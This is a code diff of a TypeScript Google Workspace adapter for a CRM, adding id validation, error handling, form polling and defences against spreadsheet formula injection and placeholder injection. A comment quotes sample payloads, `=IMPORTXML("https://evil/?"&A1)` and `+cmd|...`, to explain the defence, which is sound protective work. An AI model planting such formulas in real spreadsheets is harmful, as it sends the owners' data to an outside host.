@@ -1,22 +1,54 @@
+import { createHash } from 'node:crypto';
+import type { GoogleCapability } from '@crm/contracts';
+import { googleCalendarEnv } from '../../../config/domains/appointments-booking.env';
 import {
-  GoogleNotConnectedError,
+  classifyApiError,
+  GoogleCalendarError,
+  googleFailureCode,
+} from '../appointments-booking/google-calendar.errors';
+import { googleRequest } from '../appointments-booking/google-transport';
+import {
+  GoogleAccountError,
   type DocGenerate,
+  type FormResponseItem,
   type GoogleAccessTokens,
+  type GoogleFileItem,
+  type GoogleFileKind,
   type GoogleWorkspacePort,
   type MeetCreate,
   type SheetAppend,
+  type SheetAppendRows,
   type SheetRead,
 } from './google-workspace.port';
 
-const TIMEOUT_MS = 15_000;
 const enc = encodeURIComponent;
 
-/** Google's own hosts only: every id is encoded into a fixed URL, so nothing a flow author typed picks the host. */
-const SHEETS = 'https://sheets.googleapis.com/v4/spreadsheets';
-const DRIVE = 'https://www.googleapis.com/drive/v3/files';
-const DOCS = 'https://docs.googleapis.com/v1/documents';
-const FORMS = 'https://forms.googleapis.com/v1/forms';
-const CALENDAR = 'https://www.googleapis.com/calendar/v3/calendars/primary/events';
+/** Most submissions one poll reads for a form; a busier form catches up over the next polls. */
+const FORM_RESPONSES_MAX = 200;
+
+/**
+ * A Google file id is letters, digits, `_` and `-`. A flow author types or pastes the id, and it goes into a fixed Google URL: anything else
+ * (a `..` that the URL parser would resolve to another path, a `?` or `#`) is refused here instead of being trusted to the encoder.
+ */
+const GOOGLE_ID = /^[A-Za-z0-9_-]{1,256}$/;
+function fileId(id: string, capability: GoogleCapability): string {
+  if (!GOOGLE_ID.test(id)) {
+    throw new GoogleAccountError('GOOGLE_BAD_REQUEST', 'Not a Google file id', capability);
+  }
+  return enc(id);
+}
+
+/** Google's own hosts only (the environment names them, a flow author never does): every id is encoded into a fixed URL. */
+const apis = () => {
+  const env = googleCalendarEnv();
+  return {
+    sheets: env.GOOGLE_SHEETS_API_URL,
+    drive: env.GOOGLE_DRIVE_API_URL,
+    docs: env.GOOGLE_DOCS_API_URL,
+    forms: env.GOOGLE_FORMS_API_URL,
+    calendar: env.GOOGLE_CALENDAR_API_URL,
+  };
+};
 
 /** A1 range for a tab: the quoted tab name, or the first tab when none is named. */
 const tabRange = (tab: string, cells = ''): string =>
@@ -31,60 +63,114 @@ const norm = (s: unknown): string =>
     .trim()
     .toLowerCase();
 
+const MIME: Record<GoogleFileKind, string> = {
+  sheets: 'application/vnd.google-apps.spreadsheet',
+  docs: 'application/vnd.google-apps.document',
+  forms: 'application/vnd.google-apps.form',
+};
+
 /**
- * The Google REST APIs behind `GoogleWorkspacePort`, called with the workspace's access token from `GoogleAccessTokens`. Where the token
- * comes from (OAuth settings, a service account) is another domain's concern; with none stored every call fails with
- * `GoogleNotConnectedError`, the Reference "no Google account connected" outcome.
+ * A cell that Sheets would run as a formula (`=IMPORTDATA(...)`, `@SUM(...)`, `+cmd|...`, `-2+3`, `+91 98765`) is stored as text instead.
+ * Rows are written with `USER_ENTERED` so dates and numbers keep their type (as Reference), but a customer controls much of what a flow
+ * writes (profile name, typed answers): left alone, a name of `=IMPORTXML("https://evil/?"&A1)` would run in the owner's sheet. A leading
+ * space, tab, carriage return or other control character in front of the trigger does not hide it (spreadsheets trim some of them, and
+ * a tab or CR is itself a known trigger). A plain number (`-5`, `12.50`, `+919876543210`) is not a formula and stays as it is, so numbers
+ * stay numbers.
+ */
+export function neutraliseFormula(value: string): string {
+  // eslint-disable-next-line no-control-regex
+  const lead = /^[\u0000-\u0020\u00a0\u200b-\u200d\ufeff]*/.exec(value)![0];
+  const rest = value.slice(lead.length);
+  if (/[\t\r]/.test(lead)) return `'${value}`;
+  if (/^[=@]/.test(rest)) return `'${value}`;
+  if (/^[+-]/.test(rest) && !/^[+-]?\d+(\.\d+)?$/.test(rest)) return `'${value}`;
+  return value;
+}
+
+/**
+ * A value that goes into a document placeholder must not itself be a placeholder: the fills run one after the other, so a customer who
+ * types `{{api_token}}` as their name would otherwise have the NEXT fill replace it with that variable's value, inside a document that
+ * is then shared by link. A zero-width space after each `{` keeps the text readable and stops it matching.
+ */
+export function defangPlaceholders(value: string): string {
+  return value.replace(/\{/g, '{\u200b');
+}
+
+/**
+ * The Google REST APIs behind `GoogleWorkspacePort`, called with the workspace's one Google account through `GoogleAccessTokens`. Every
+ * failure leaves as a `GoogleAccountError` with a stable code; Google's wording never reaches a flow author or a log line, and a token
+ * never does either (the token is only ever in the Authorization header of `googleRequest`).
  */
 export class HttpGoogleWorkspace implements GoogleWorkspacePort {
   constructor(
     private readonly tokens: GoogleAccessTokens,
-    private readonly http: typeof fetch = fetch,
+    private readonly http?: typeof fetch,
   ) {}
 
-  private async call<T>(orgId: number, url: string, init: RequestInit = {}): Promise<T> {
-    const token = await this.tokens.accessToken(orgId);
-    if (!token) throw new GoogleNotConnectedError();
-    const res = await this.http(url, {
-      ...init,
-      headers: {
-        authorization: `Bearer ${token}`,
-        'content-type': 'application/json',
-        ...init.headers,
-      },
-      redirect: 'error',
-      signal: AbortSignal.timeout(TIMEOUT_MS),
-    });
-    const text = await res.text();
-    if (!res.ok) throw new Error(`Google answered HTTP ${res.status}: ${text.slice(0, 200)}`);
-    return (text === '' ? {} : JSON.parse(text)) as T;
+  private async call<T>(
+    orgId: number,
+    capability: GoogleCapability,
+    url: string,
+    init: { method?: string; body?: unknown; idempotent?: boolean } = {},
+  ): Promise<T> {
+    try {
+      return (await this.tokens.withToken(orgId, capability, (token) =>
+        googleRequest(url, {
+          method: init.method,
+          token,
+          headers: init.body === undefined ? {} : { 'content-type': 'application/json' },
+          body: init.body === undefined ? undefined : JSON.stringify(init.body),
+          classify: classifyApiError,
+          idempotent: init.idempotent,
+          fetchImpl: this.http,
+        }),
+      )) as T;
+    } catch (err) {
+      throw toAccountError(err, capability);
+    }
   }
 
   private async headerRow(orgId: number, sheetId: string, tab: string): Promise<string[]> {
     const r = await this.call<{ values?: string[][] }>(
       orgId,
-      `${SHEETS}/${enc(sheetId)}/values/${enc(tabRange(tab, '1:1'))}`,
+      'sheets',
+      `${apis().sheets}/${fileId(sheetId, 'sheets')}/values/${enc(tabRange(tab, '1:1'))}`,
     );
     return (r.values?.[0] ?? []).map(String);
   }
 
   async appendSheetRow(orgId: number, req: SheetAppend): Promise<void> {
-    let values = req.values;
+    const { values, ...rest } = req;
+    await this.appendSheetRows(orgId, { ...rest, rows: [values] });
+  }
+
+  async appendSheetRows(orgId: number, req: SheetAppendRows): Promise<void> {
+    let rows = req.rows;
     if (req.matchByHeader && req.columnHeaders.length > 0) {
       const sheet = await this.headerRow(orgId, req.sheetId, req.tabName);
-      if (sheet.length > 0) values = placeUnderHeaders(sheet, req.columnHeaders, req.values);
+      if (sheet.length > 0) {
+        rows = rows.map((r) => placeUnderHeaders(sheet, req.columnHeaders, r));
+      }
     }
     await this.call(
       orgId,
-      `${SHEETS}/${enc(req.sheetId)}/values/${enc(tabRange(req.tabName))}:append?valueInputOption=USER_ENTERED&insertDataOption=INSERT_ROWS`,
-      { method: 'POST', body: JSON.stringify({ values: [values] }) },
+      'sheets',
+      `${apis().sheets}/${fileId(req.sheetId, 'sheets')}/values/${enc(tabRange(req.tabName))}:append?valueInputOption=USER_ENTERED&insertDataOption=INSERT_ROWS`,
+      // A repeat of a row append cannot be told from a second row: only a 429 (refused before any work) is retried. All the rows of a
+      // step travel in this one request, so a failed call wrote all of them or none.
+      {
+        method: 'POST',
+        body: { values: rows.map((r) => r.map(neutraliseFormula)) },
+        idempotent: false,
+      },
     );
   }
 
   async readSheetRows(orgId: number, req: SheetRead): Promise<Array<Record<string, string>>> {
     const r = await this.call<{ values?: string[][] }>(
       orgId,
-      `${SHEETS}/${enc(req.sheetId)}/values/${enc(tabRange(req.tabName, 'A:ZZ'))}`,
+      'sheets',
+      `${apis().sheets}/${fileId(req.sheetId, 'sheets')}/values/${enc(tabRange(req.tabName, 'A:ZZ'))}`,
     );
     const [headers = [], ...body] = r.values ?? [];
     const rows: Array<Record<string, string>> = [];
@@ -103,60 +189,206 @@ export class HttpGoogleWorkspace implements GoogleWorkspacePort {
     return rows;
   }
 
-  async generateDoc(orgId: number, req: DocGenerate): Promise<{ url: string }> {
-    const copy = await this.call<{ id: string }>(orgId, `${DRIVE}/${enc(req.templateId)}/copy`, {
-      method: 'POST',
-      body: JSON.stringify({ name: req.newTitle }),
-    });
-    const requests = Object.entries(req.vars).map(([key, value]) => ({
-      replaceAllText: {
-        containsText: { text: `{{${key}}}`, matchCase: false },
-        replaceText: value,
-      },
-    }));
+  async generateDoc(orgId: number, req: DocGenerate): Promise<{ url: string; warnings: string[] }> {
+    // The grant may read every file of the account (full Drive scope), and the copy is shared by link: only a Google Doc is copied, not
+    // whatever file id a flow author typed.
+    const meta = await this.call<{ mimeType?: string }>(
+      orgId,
+      'docs',
+      `${apis().drive}/${fileId(req.templateId, 'docs')}?fields=mimeType`,
+    );
+    if (meta.mimeType !== 'application/vnd.google-apps.document') {
+      throw new GoogleAccountError('GOOGLE_BAD_REQUEST', 'Not a Google document', 'docs');
+    }
+    const copy = await this.call<{ id: string }>(
+      orgId,
+      'docs',
+      `${apis().drive}/${fileId(req.templateId, 'docs')}/copy`,
+      { method: 'POST', body: { name: req.newTitle }, idempotent: false },
+    );
+    const warnings: string[] = [];
+    // `{{key}}` and `{key}` both, as Reference did, so a template written either way is filled.
+    const requests = Object.entries(req.vars).flatMap(([key, value]) =>
+      [`{{${key}}}`, `{${key}}`].map((needle) => ({
+        replaceAllText: {
+          containsText: { text: needle, matchCase: false },
+          replaceText: defangPlaceholders(value),
+        },
+      })),
+    );
+    // The copy exists from here on: a fill or a share that fails does not lose it (Reference kept the link and carried on).
     if (requests.length > 0) {
-      await this.call(orgId, `${DOCS}/${enc(copy.id)}:batchUpdate`, {
-        method: 'POST',
-        body: JSON.stringify({ requests }),
-      });
+      try {
+        await this.call(orgId, 'docs', `${apis().docs}/${fileId(copy.id, 'docs')}:batchUpdate`, {
+          method: 'POST',
+          body: { requests },
+        });
+      } catch (err) {
+        warnings.push(`fill:${(err as GoogleAccountError).code ?? 'GOOGLE_UNAVAILABLE'}`);
+      }
     }
     if (req.shareable) {
-      await this.call(orgId, `${DRIVE}/${enc(copy.id)}/permissions`, {
-        method: 'POST',
-        body: JSON.stringify({ type: 'anyone', role: 'reader' }),
-      });
+      try {
+        await this.call(orgId, 'docs', `${apis().drive}/${fileId(copy.id, 'docs')}/permissions`, {
+          method: 'POST',
+          body: { type: 'anyone', role: 'reader' },
+        });
+      } catch (err) {
+        warnings.push(`share:${(err as GoogleAccountError).code ?? 'GOOGLE_UNAVAILABLE'}`);
+      }
     }
-    return { url: `https://docs.google.com/document/d/${copy.id}/edit` };
+    return { url: `https://docs.google.com/document/d/${copy.id}/edit`, warnings };
   }
 
   async formResponderUrl(orgId: number, formId: string): Promise<{ url: string }> {
-    const f = await this.call<{ responderUri?: string }>(orgId, `${FORMS}/${enc(formId)}`);
-    if (!f.responderUri) throw new Error('The form has no responder link');
+    const f = await this.call<{ responderUri?: string }>(
+      orgId,
+      'forms',
+      `${apis().forms}/${fileId(formId, 'forms')}`,
+    );
+    if (!f.responderUri) {
+      throw new GoogleAccountError('GOOGLE_NOT_FOUND', 'The form has no responder link', 'forms');
+    }
     return { url: f.responderUri };
   }
 
-  async createMeet(orgId: number, req: MeetCreate): Promise<{ meetUrl: string; eventId: string }> {
-    const e = await this.call<{ id?: string; hangoutLink?: string }>(
-      orgId,
-      `${CALENDAR}?conferenceDataVersion=1&sendUpdates=${req.sendInvites ? 'all' : 'none'}`,
-      {
-        method: 'POST',
-        body: JSON.stringify({
-          summary: req.title,
-          start: { dateTime: req.startAt.toISOString(), timeZone: req.timeZone },
-          end: { dateTime: req.endAt.toISOString(), timeZone: req.timeZone },
-          conferenceData: {
-            createRequest: {
-              requestId: req.requestId,
-              conferenceSolutionKey: { type: 'hangoutsMeet' },
-            },
-          },
-        }),
-      },
-    );
-    if (!e.hangoutLink) throw new Error('Google created the event without a Meet link');
-    return { meetUrl: e.hangoutLink, eventId: e.id ?? '' };
+  async formResponses(orgId: number, formId: string, since: Date): Promise<FormResponseItem[]> {
+    const id = fileId(formId, 'forms');
+    // Question ids mean nothing to a flow author: the answers are keyed by the question's title, as the form shows it.
+    const form = await this.call<{
+      items?: Array<{ title?: string; questionItem?: { question?: { questionId?: string } } }>;
+    }>(orgId, 'forms', `${apis().forms}/${id}`);
+    const titles = new Map<string, string>();
+    for (const it of form.items ?? []) {
+      const qid = it.questionItem?.question?.questionId;
+      if (qid) titles.set(qid, it.title ?? qid);
+    }
+    type Raw = {
+      responseId?: string;
+      createTime?: string;
+      lastSubmittedTime?: string;
+      respondentEmail?: string;
+      answers?: Record<string, { textAnswers?: { answers?: Array<{ value?: string }> } }>;
+    };
+    const out: FormResponseItem[] = [];
+    let page = '';
+    for (let n = 0; n < 4 && out.length < FORM_RESPONSES_MAX; n++) {
+      const filter = enc(`timestamp >= ${since.toISOString()}`);
+      const r = await this.call<{ responses?: Raw[]; nextPageToken?: string }>(
+        orgId,
+        'forms',
+        `${apis().forms}/${id}/responses?pageSize=100&filter=${filter}${page ? `&pageToken=${enc(page)}` : ''}`,
+      );
+      for (const x of r.responses ?? []) {
+        const at = new Date(x.lastSubmittedTime ?? x.createTime ?? '');
+        if (!x.responseId || Number.isNaN(at.getTime())) continue;
+        const answers: Record<string, string | string[]> = {};
+        for (const [qid, a] of Object.entries(x.answers ?? {})) {
+          const values = (a.textAnswers?.answers ?? []).map((v) => String(v.value ?? ''));
+          answers[titles.get(qid) ?? qid] = values.length === 1 ? values[0]! : values;
+        }
+        out.push({
+          responseId: x.responseId,
+          respondent: x.respondentEmail || null,
+          submittedAt: at,
+          answers,
+        });
+      }
+      if (!r.nextPageToken) break;
+      page = r.nextPageToken;
+    }
+    return out
+      .sort((a, b) => a.submittedAt.getTime() - b.submittedAt.getTime())
+      .slice(0, FORM_RESPONSES_MAX);
   }
+
+  async createMeet(orgId: number, req: MeetCreate): Promise<{ meetUrl: string; eventId: string }> {
+    const calendar = enc(await this.tokens.calendarId(orgId));
+    const id = eventIdForKey(req.requestId);
+    const body = {
+      id,
+      summary: req.title,
+      start: { dateTime: req.startAt.toISOString(), timeZone: req.timeZone },
+      end: { dateTime: req.endAt.toISOString(), timeZone: req.timeZone },
+      conferenceData: {
+        createRequest: {
+          requestId: req.requestId,
+          conferenceSolutionKey: { type: 'hangoutsMeet' },
+        },
+      },
+    };
+    const base = `${apis().calendar}/calendars/${calendar}/events`;
+    let e: { id?: string; hangoutLink?: string };
+    try {
+      e = await this.call<{ id?: string; hangoutLink?: string }>(
+        orgId,
+        'calendar',
+        `${base}?conferenceDataVersion=1&sendUpdates=${req.sendInvites ? 'all' : 'none'}`,
+        { method: 'POST', body },
+      );
+    } catch (err) {
+      // The id is derived from the step, so a 409 means this very step already made its event (a retried step, or a lost answer):
+      // read it back instead of making a second meeting.
+      if (!(err instanceof GoogleAccountError) || err.status !== 409) throw err;
+      e = await this.call<{ id?: string; hangoutLink?: string }>(
+        orgId,
+        'calendar',
+        `${base}/${id}?conferenceDataVersion=1`,
+      ).catch(() => {
+        throw err;
+      });
+    }
+    if (!e.hangoutLink) {
+      throw new GoogleAccountError(
+        'GOOGLE_BAD_REQUEST',
+        'Google created the event without a Meet link',
+        'calendar',
+      );
+    }
+    return { meetUrl: e.hangoutLink, eventId: e.id ?? id };
+  }
+
+  async listFiles(orgId: number, kind: GoogleFileKind): Promise<GoogleFileItem[]> {
+    const q = new URLSearchParams({
+      q: `mimeType='${MIME[kind]}' and trashed=false`,
+      pageSize: '100',
+      orderBy: 'modifiedTime desc',
+      fields: 'files(id,name)',
+    });
+    const r = await this.call<{ files?: Array<{ id?: unknown; name?: unknown }> }>(
+      orgId,
+      'drive_listing',
+      `${apis().drive}?${q}`,
+    );
+    return (r.files ?? [])
+      .filter((f) => typeof f.id === 'string' && f.id !== '')
+      .map((f) => ({ id: String(f.id), name: typeof f.name === 'string' ? f.name : String(f.id) }));
+  }
+}
+
+/** A Google event id (base32hex: `0-9a-v`, 5 to 1024 characters) that is the same for the same key: a SHA-256, lower-case hex (64 characters). */
+export function eventIdForKey(key: string): string {
+  return createHash('sha256').update(key).digest('hex');
+}
+
+/** Whatever went wrong inside a Google call, as the stable error flows and pages branch on. A `GoogleAccountError` passes through. */
+export function toAccountError(err: unknown, capability: GoogleCapability): GoogleAccountError {
+  if (err instanceof GoogleAccountError) return err;
+  if (err instanceof GoogleCalendarError) {
+    const code = googleFailureCode(err);
+    return new GoogleAccountError(
+      code,
+      `Google ${err.kind} (${err.status}${err.reason ? `, ${err.reason}` : ''})`,
+      capability,
+      err.retryAfterSeconds,
+      err.status,
+    );
+  }
+  return new GoogleAccountError(
+    'GOOGLE_UNAVAILABLE',
+    err instanceof Error ? err.message : String(err),
+    capability,
+  );
 }
 
 /**
